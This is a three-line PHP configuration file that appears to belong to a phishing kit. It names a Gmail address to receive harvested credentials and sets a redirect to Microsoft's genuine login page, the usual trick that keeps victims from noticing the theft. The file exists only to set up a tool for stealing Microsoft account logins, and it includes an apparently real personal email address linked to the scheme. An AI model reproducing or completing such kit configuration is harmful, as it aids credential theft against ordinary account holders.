<?php 
$Receive_email="omarshefo1337@gmail.com";
$redirect="https://login.microsoftonline.com/";
?>